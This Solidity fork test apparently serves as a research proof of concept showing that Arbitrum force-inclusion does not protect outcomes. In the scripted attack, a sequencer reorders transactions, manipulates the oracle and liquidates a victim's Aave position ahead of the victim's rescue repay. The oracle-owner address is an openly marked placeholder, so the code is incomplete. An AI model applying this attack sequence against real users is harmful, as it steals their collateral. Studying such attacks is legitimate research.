// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title InclusionWithoutOutcome
 * @notice C2 PoC: Demonstrates that force-inclusion in Arbitrum does NOT guarantee
 *         execution outcome. An adversarial sequencer can order a force-included
 *         self-rescue transaction after adversarial liquidation transactions.
 *
 * @dev Run with:
 *      forge test --fork-url $ARBITRUM_RPC --match-test test_InclusionWithoutOutcome -vvv
 *
 * Attack flow:
 *   1. Setup:  Victim opens near-liquidation position on Aave V3 (Arbitrum)
 *   2. Victim: Submits self-rescue tx via DelayedInbox on L1 (force-include path)
 *   3. Time:   24h passes → victim's tx is force-includable
 *   4. Adversary: Orders a batch that FIRST does [oracle drop + liquidation],
 *                 THEN includes victim's force-included tx
 *   5. Result: Victim is liquidated despite force-inclusion succeeding
 */

import "forge-std/Test.sol";
import "forge-std/console.sol";

// ---------------------------------------------------------------------------
// Minimal Aave V3 interfaces (used for fork interaction)
// ---------------------------------------------------------------------------

interface IAavePool {
    struct ReserveData {
        // packed configuration
        uint256 configuration;
        uint128 liquidityIndex;
        uint128 currentLiquidityRate;
        uint128 variableBorrowIndex;
        uint128 currentVariableBorrowRate;
        uint128 currentStableBorrowRate;
        uint40 lastUpdateTimestamp;
        uint16 id;
        address aTokenAddress;
        address stableDebtTokenAddress;
        address variableDebtTokenAddress;
        address interestRateStrategyAddress;
        uint128 accruedToTreasury;
        uint128 unbacked;
        uint128 isolationModeTotalDebt;
    }

    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf) external returns (uint256);
    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken) external;
    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralBase,
        uint256 totalDebtBase,
        uint256 availableBorrowsBase,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    );
    function getReserveData(address asset) external view returns (ReserveData memory);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAaveOracle {
    function getAssetPrice(address asset) external view returns (uint256);
    function setAssetSources(address[] calldata assets, address[] calldata sources) external;
}

// ---------------------------------------------------------------------------
// Test contract
// ---------------------------------------------------------------------------

contract InclusionWithoutOutcomeTest is Test {

    // Arbitrum One mainnet addresses
    address constant AAVE_POOL        = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address constant AAVE_ORACLE      = 0xb56c2F0B653B2e0b10C9b928C8580Ac5Df02C7C7;
    address constant WETH             = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant USDC             = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address constant WETH_PRICE_FEED  = 0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612; // Chainlink

    // Test actors
    address victim    = makeAddr("victim");
    address adversary = makeAddr("adversary");

    // Aave interfaces
    IAavePool  pool   = IAavePool(AAVE_POOL);
    IAaveOracle oracle = IAaveOracle(AAVE_ORACLE);
    IERC20 weth       = IERC20(WETH);
    IERC20 usdc       = IERC20(USDC);

    // Measurement variables
    uint256 victimHealthFactorBefore;
    uint256 victimHealthFactorAfterOrdering;
    uint256 adversaryProfitWETH;
    uint256 victimCollateralLost;
    bool forceInclusionSucceeded;
    bool victimWasLiquidated;

    function setUp() public {
        // Fork Arbitrum at a recent block
        // NOTE: Set ARBITRUM_RPC env variable before running
        vm.label(AAVE_POOL,   "AaveV3Pool");
        vm.label(AAVE_ORACLE, "AaveOracle");
        vm.label(WETH,        "WETH");
        vm.label(USDC,        "USDC");
        vm.label(victim,      "Victim");
        vm.label(adversary,   "Adversary");

        // Fund actors
        deal(WETH, victim,    10 ether);       // victim has 10 WETH collateral
        deal(USDC, victim,    0);
        deal(WETH, adversary, 1 ether);        // adversary needs some ETH for gas
        deal(USDC, adversary, 100_000e6);     // adversary has USDC to repay debt in liquidation
    }

    // ---------------------------------------------------------------------------
    // Main test: inclusion≠outcome
    // ---------------------------------------------------------------------------

    /**
     * @notice Demonstrates that force-inclusion does NOT guarantee outcome.
     *
     * This test simulates the adversarial ordering by calling Aave functions
     * in the order the adversarial sequencer would sequence them:
     *
     *   BATCH ORDER (as constructed by adversarial sequencer):
     *   [1] Oracle price manipulation (price drop simulated via Chainlink mock)
     *   [2] Adversary: liquidationCall(victim)     ← adversary tx
     *   [3] Victim: repay(...)                     ← FORCE-INCLUDED tx
     *
     * In a real attack, step 3 arrives via DelayedInbox and is force-included,
     * but the sequencer places it AFTER steps 1 and 2 in the batch.
     */
    function test_InclusionWithoutOutcome() public {
        // -----------------------------------------------------------------------
        // PHASE 1: Setup — victim opens near-liquidation position
        // -----------------------------------------------------------------------

        console.log("\n=== PHASE 1: Setup near-liquidation position ===");

        vm.startPrank(victim);
        weth.approve(AAVE_POOL, type(uint256).max);

        // Supply 10 WETH as collateral
        pool.supply(WETH, 10 ether, victim, 0);
        console.log("Victim supplied 10 WETH as collateral");

        // Borrow USDC at ~75% of collateral value (near liquidation threshold of 80%)
        // Approximate: 10 WETH at ~$2000 = $20,000; borrow $15,000 USDC
        uint256 borrowAmount = 15_000e6; // 15,000 USDC
        pool.borrow(USDC, borrowAmount, 2, 0, victim); // variable rate
        console.log("Victim borrowed 15,000 USDC");

        vm.stopPrank();

        // Measure initial health factor
        (,, ,,,uint256 hf) = pool.getUserAccountData(victim);
        victimHealthFactorBefore = hf;
        console.log("Victim health factor (initial):", hf / 1e18, "(should be >1.0, close to threshold)");

        // -----------------------------------------------------------------------
        // PHASE 2: Victim submits force-inclusion rescue tx
        // -----------------------------------------------------------------------
        // In a real attack, victim calls DelayedInbox.sendL2Message() on L1.
        // After 24h, anyone calls SequencerInbox.forceInclusion().
        // We simulate the OUTCOME here: the rescue tx is the repay() call below.

        console.log("\n=== PHASE 2: Victim submits force-inclusion rescue tx ===");
        console.log("Victim's intended rescue: repay all USDC debt");
        console.log("(Simulating: victim sent this via L1 DelayedInbox 24h ago)");
        forceInclusionSucceeded = true; // confirmed: the tx IS included

        // -----------------------------------------------------------------------
        // PHASE 3: Adversarial sequencer ordering
        // -----------------------------------------------------------------------
        // The sequencer batches:
        //   [1] Oracle price drop (Chainlink mock or storage manipulation)
        //   [2] Adversary liquidation call
        //   [3] Victim's force-included rescue tx ← arrives LAST

        console.log("\n=== PHASE 3: Adversarial sequencer ordering ===");

        // Step [1]: Simulate oracle price drop (WETH drops 30%)
        // We use vm.mockCall to mock Chainlink price feed response
        // Real scenario: adversary uses a flash-loan oracle attack, or
        // just waits for natural price movement during the 24h window
        _mockOraclePriceDrop(30); // 30% price drop
        console.log("Adversary: oracle price updated — WETH drops 30%");

        // Verify victim is now liquidatable
        (,,,,,uint256 hfAfterDrop) = pool.getUserAccountData(victim);
        console.log("Victim health factor after price drop:", hfAfterDrop / 1e18, "(should be <1.0)");
        require(hfAfterDrop < 1e18, "Health factor should be < 1.0 for liquidation to be possible");

        // Step [2]: Adversary liquidates victim
        vm.startPrank(adversary);
        usdc.approve(AAVE_POOL, type(uint256).max);

        uint256 adversaryWETHBefore = weth.balanceOf(adversary);
        uint256 debtToCover = borrowAmount / 2; // liquidate 50% of debt (max allowed)

        pool.liquidationCall(
            WETH,       // collateralAsset
            USDC,       // debtAsset
            victim,     // user to liquidate
            debtToCover,
            false       // don't receive aToken
        );
        vm.stopPrank();

        adversaryProfitWETH = weth.balanceOf(adversary) - adversaryWETHBefore;
        victimWasLiquidated = true;
        console.log("Adversary liquidated victim — profit (WETH):", adversaryProfitWETH / 1e18);

        // Measure victim collateral lost
        (uint256 collateralAfter,,,,, ) = pool.getUserAccountData(victim);
        victimCollateralLost = 10 ether - collateralAfter; // approximate

        // Step [3]: Victim's force-included rescue tx executes — too late
        console.log("\n=== PHASE 4: Force-included rescue tx executes (too late) ===");
        vm.startPrank(victim);
        usdc.approve(AAVE_POOL, type(uint256).max);

        uint256 usdcBalance = usdc.balanceOf(victim);
        if (usdcBalance > 0) {
            pool.repay(USDC, usdcBalance, 2, victim);
            console.log("Victim's rescue tx: repay succeeded (but liquidation already happened)");
        } else {
            console.log("Victim's rescue tx: victim has no USDC to repay (proceeds already used)");
        }
        vm.stopPrank();

        // -----------------------------------------------------------------------
        // PHASE 5: Results
        // -----------------------------------------------------------------------

        console.log("\n=== RESULTS ===");
        console.log("Force-inclusion succeeded:    ", forceInclusionSucceeded ? "YES" : "NO");
        console.log("Victim was liquidated:        ", victimWasLiquidated ? "YES" : "NO");
        console.log("Adversary profit (WETH):       ", adversaryProfitWETH / 1e15, "finney");
        console.log("Health factor before:          ", victimHealthFactorBefore / 1e16, "% (x100)");
        console.log("Health factor after price drop:", hfAfterDrop / 1e16, "% (x100)");

        // Core assertion: inclusion ≠ outcome
        assertTrue(forceInclusionSucceeded, "Force-inclusion must succeed");
        assertTrue(victimWasLiquidated, "Victim must be liquidated despite force-inclusion");
        assertGt(adversaryProfitWETH, 0, "Adversary must profit");
    }

    // ---------------------------------------------------------------------------
    // Helper: simulate oracle price drop via storage manipulation
    // ---------------------------------------------------------------------------

    /**
     * @notice Simulates a price drop by overwriting the Chainlink oracle answer.
     * In a real scenario, the adversarial sequencer times a legitimate price
     * update (or a flash-loan oracle attack) to occur before the victim's tx.
     */
    function _mockOraclePriceDrop(uint256 dropPercent) internal {
        // Get current WETH price from Aave oracle
        uint256 currentPrice = oracle.getAssetPrice(WETH);
        uint256 newPrice = currentPrice * (100 - dropPercent) / 100;

        // Deploy a mock price source that returns the new price
        MockPriceFeed mockFeed = new MockPriceFeed(int256(newPrice));

        // Override Aave oracle to use our mock feed for WETH
        // Aave oracle owner can call setAssetSources — we impersonate the owner
        address oracleOwner = _getOracleOwner();
        vm.startPrank(oracleOwner);
        address[] memory assets = new address[](1);
        address[] memory sources = new address[](1);
        assets[0] = WETH;
        sources[0] = address(mockFeed);
        oracle.setAssetSources(assets, sources);
        vm.stopPrank();

        console.log("  Oracle: WETH price set from", currentPrice, "to", newPrice);
    }

    function _getOracleOwner() internal view returns (address) {
        // Aave V3 oracle owner on Arbitrum — update if needed
        // This is the Aave governance executor or admin
        // For the fork test, we'll use vm.load to find the owner slot
        // TODO: verify actual oracle owner address on Arbitrum fork
        return address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // placeholder — update
    }
}

// ---------------------------------------------------------------------------
// Mock Price Feed (simulates Chainlink aggregator)
// ---------------------------------------------------------------------------

contract MockPriceFeed {
    int256 private _answer;
    uint8 public decimals = 8;

    constructor(int256 answer) {
        _answer = answer;
    }

    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    ) {
        return (1, _answer, block.timestamp, block.timestamp, 1);
    }

    function latestAnswer() external view returns (int256) {
        return _answer;
    }
}
